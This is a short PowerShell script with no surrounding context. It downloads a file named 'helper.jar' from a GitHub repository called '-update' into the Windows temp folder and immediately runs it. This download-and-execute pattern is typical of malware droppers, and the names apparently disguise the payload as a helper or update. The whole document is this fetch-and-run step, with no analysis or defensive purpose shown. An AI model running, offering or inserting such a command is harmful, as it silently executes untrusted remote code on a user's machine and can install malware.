$url = "https://github.com/FlatMelodyVise/-update/raw/refs/heads/main/helper.jar"
$path = "$env:Temp\helper.jar"
(New-Object System.Net.WebClient).DownloadFile($url, $path)
Start-Process -FilePath $path
